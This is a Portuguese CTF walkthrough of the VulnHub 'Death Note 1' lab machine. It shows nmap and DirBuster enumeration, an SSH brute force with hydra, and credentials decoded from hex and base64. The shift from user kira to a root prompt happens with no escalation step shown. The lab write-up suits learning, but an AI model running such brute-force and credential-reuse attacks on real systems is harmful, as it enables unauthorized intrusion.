---
title: "Death Note 1 — VulnHub Walkthrough Completo"
date: 2026-02-21
description: "Walkthrough da máquina Death Note 1 do VulnHub: reconhecimento, brute-force SSH com Hydra, decodificação hex/base64 e captura do root.txt."
category: ctf
os: [linux]
difficulty: easy
mitre_tactic: TA0001
mitre_technique: T1190
tags: [ctf, vulnhub, linux, brute-force, hydra, nmap, ssh, web-enumeration]
status: published
---

## 1. Introdução

A máquina **Death Note 1** está disponível no [VulnHub](https://www.vulnhub.com/entry/deathnote-1,739/) e é classificada com dificuldade **Fácil**. O objetivo é comprometer o servidor, escalando do acesso web até a leitura do arquivo `root.txt`. A temática é inspirada no anime *Death Note*, com usuários como **kira**, **L** e **Misa** distribuídos pela máquina.

O ambiente utilizado neste walkthrough é uma rede local com a máquina alvo em `192.168.3.152` e a máquina atacante rodando **Kali Linux**.

---

## 2. Reconhecimento

### 2.1 Descoberta de Host

Utilizamos o `netdiscover` para mapear os hosts ativos na rede `/16` e identificar o IP da máquina alvo.

```bash
netdiscover -r 192.168.0.0/16
```

```text
Currently scanning: 192.168.0.0/16  |  Screen View: Unique Hosts
4 Captured ARP Req/Rep packets, from 4 hosts. Total size: 240

IP             At MAC Address      Count  Len  MAC Vendor / Hostname
192.168.0.1    d8:07:b6:96:bf:c8   1      60   TP-LINK TECHNOLOGIES CO.,LTD.
192.168.3.1    88:36:cf:5d:f9:e5   1      60   Huawei Device Co., Ltd.
192.168.3.126  dc:21:5c:76:38:2e   1      60   Intel Corporate
192.168.3.152  08:00:27:72:d0:cd   1      60   PCS Systemtechnik GmbH   ← ALVO
```

### 2.2 Scan de Portas e Serviços

```bash
nmap -sS -A 192.168.3.152
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html)
```

Foram identificadas **duas portas abertas**:

- **22/TCP** — SSH (OpenSSH 7.9p1)
- **80/TCP** — HTTP (Apache 2.4.38)

---

## 3. Enumeração Web

### 3.1 Acesso Inicial

Acessando `http://192.168.3.152` pelo navegador, encontramos um site totalmente desconfigurável. Navegando para o diretório `/wordpress/`, encontramos um blog WordPress com o usuário **kira** e o post *"i will eliminate you L!"*, contendo a frase:

> *"my fav line is iamjustic3"*

Isso serve como dica importante para a fase de exploração.

### 3.2 Enumeração de Diretórios com DirBuster

```bash
# Utilizando OWASP DirBuster 1.0-RC1 contra http://192.168.3.152:80/
# Wordlist padrão do DirBuster, 200 threads
```

```text
Diretórios/Arquivos relevantes encontrados (HTTP 200):
/wp-content/uploads/2021/07/
/wp-content/uploads/2021/07/user.txt   (359 bytes)
/wp-content/uploads/2021/07/notes.txt  (745 bytes)
/license.txt
/robots.txt
/manual/
```

Foram encontrados dois arquivos `.txt` no diretório de uploads do WordPress:

- **`user.txt`** — lista de possíveis nomes de usuário
- **`notes.txt`** — lista de possíveis senhas

### 3.3 Análise do robots.txt

```bash
curl http://192.168.3.152/robots.txt
```

```text
fuck it my dad
added hint on /important.jpg

ryuk please delete it
```

O `robots.txt` revela a existência do arquivo `/important.jpg`.

### 3.4 Leitura do important.jpg via curl

O arquivo `important.jpg` estava corrompido como imagem. Usando `curl`, foi possível ler seu conteúdo de texto:

```bash
curl http://192.168.3.152/important.jpg
```

```text
i am Soichiro Yagami, light's father
i have a doubt if L is true about the assumption that light is kira

i can only help you by giving something important

login username : user.txt
i don't know the password.
find it by yourself
but i think it is in the hint section of site
```

Confirmação: **`user.txt`** é a wordlist de usuários e a senha está em **`notes.txt`**.

---

## 4. Exploração

### 4.1 Brute-Force SSH com Hydra

Com as wordlists `user.txt` e `notes.txt` em mãos, realizamos o ataque de força bruta no serviço SSH:

```bash
hydra -L user.txt -P notes.txt 192.168.3.152 ssh
```

```text
[DATA] max 16 tasks per 1 server, overall 16 tasks, 731 login tries (l:17/p:43)
[DATA] attacking ssh://192.168.3.152:22/
[STATUS] 293.00 tries/min, 293 tries in 00:01h
[22][ssh] host: 192.168.3.152   login: l   password: deathnote
```

> ✅ **Credenciais encontradas: `l` / `deathnote`**

---

## 5. Acesso Inicial

### 5.1 Login SSH como usuário `l`

```bash
ssh l@192.168.3.152
```

```text
l@192.168.3.152's password: deathnote

Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_64

l@deathnote:~$
```

Acesso obtido com sucesso ao shell da máquina alvo.

---

## 6. Pós-Exploração / Escalada

### 6.1 Descoberta do Diretório /opt/L

```bash
l@deathnote:~$ cd /opt
l@deathnote:/opt$ ls -l
```

```text
drwxr-xr-x 4 root root 4096 Aug 29 2021 L
```

```bash
l@deathnote:/opt$ cd L && ls -l
```

```text
drwxr-xr-x 2 root root 4096 Aug 29 2021 fake-notebook-rule
drwxr-xr-x 2 root root 4096 Aug 29 2021 kira-case
```

### 6.2 Leitura do case-file.txt

```bash
l@deathnote:/opt/L$ cd kira-case && cat case-file.txt
```

```text
the FBI agent died on December 27, 2006

1 week after the investigation of the task-force member/head.
aka.....
Soichiro Yagami's family.

hmmmmmmmmmm......
and according to watari,
he died as other died after Kira targeted them.

and we also found something in fake-notebook-rule folder.
```

### 6.3 Decodificação Hex + Base64 do case.wav

Dentro do diretório `fake-notebook-rule`, encontramos um arquivo `case.wav` ilegível como áudio:

```bash
l@deathnote:/opt/L/fake-notebook-rule$ cat case.wav
```

```text
63 47 46 7a 63 33 64 6b 49 44 4f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
```

```bash
l@deathnote:/opt/L/fake-notebook-rule$ cat hint
```

```text
use cyberchef
```

Utilizando o **CyberChef** com a receita `From Hex → From Base64`:

```text
Input (Hex):
63 47 46 7a 63 33 64 6b 49 44 4f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d

Step 1 — From Hex:
cGFzc3dkIDoga2lyYWlzZXZpbCA=

Step 2 — From Base64:
passwd : kiraisevil
```

> ✅ **Nova credencial encontrada: `kira` / `kiraisevil`**

### 6.4 Login como kira e decodificação do kira.txt

```bash
# Elevando para o usuário kira (ou reconectando via SSH)
ssh kira@192.168.3.152
# senha: kiraisevil

root@deathnote:/home/kira# cat kira.txt
```

```text
cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp
```

Decodificando novamente via **CyberChef** (`From Base64`):

```text
please protect one of the following
1. L (/opt)
2. Misa (/var)
```

### 6.5 Descoberta do arquivo Misa em /var

```bash
root@deathnote:/var# cat misa
```

```text
it is toooo late for misa
```

---

## 7. Flags / Root

### 7.1 Captura do root.txt

Navegando para o diretório home de root, localizamos o arquivo `root.txt`:

```bash
root@deathnote:/var# cd
root@deathnote:~# ls
root.txt

root@deathnote:~# cat root.txt
```

```text
[REDACTED]

##########follow me on twitter###########3
and share this screen shot and tag @KDSAMF
```

> 🏁 **CTF concluído com sucesso!** A flag final foi obtida no arquivo `root.txt` no diretório home do usuário `root`.

---

## 8. Conclusão

A máquina **Death Note 1** é um ótimo exercício para iniciantes em CTF, percorrendo um caminho clássico de comprometimento:

| Etapa | Técnica | Ferramenta |
|---|---|---|
| Descoberta de host | ARP scan passivo | `netdiscover` |
| Mapeamento de superfície | Port/service scan | `nmap` |
| Enumeração web | Directory brute-force | `DirBuster` |
| Coleta de wordlists | Leitura de arquivos expostos | `curl` |
| Acesso inicial | SSH brute-force | `hydra` |
| Pós-exploração | Decodificação Hex + Base64 | `CyberChef` |
| Escalada lateral | Reutilização de credencial | `ssh` |
| Captura de flag | Leitura de arquivo root | `cat` |

**Principais aprendizados:**

- Arquivos aparentemente "corrompidos" podem conter dados úteis — sempre use `curl` ou `cat` antes de descartar.
- Wordlists expostas em diretórios web são um vetor crítico de ataque.
- Dados codificados em múltiplas camadas (Hex → Base64) são comuns em CTFs de nível fácil; ferramentas como CyberChef agilizam drasticamente a análise.
- A enumeração metódica de diretórios (`/opt`, `/var`) após o acesso inicial é essencial para encontrar caminhos de escalada.

---

*Escrito por **G4ij1ntoor** — [KBM Security](https://kbmsecurity.com) · r3d/ops blog*
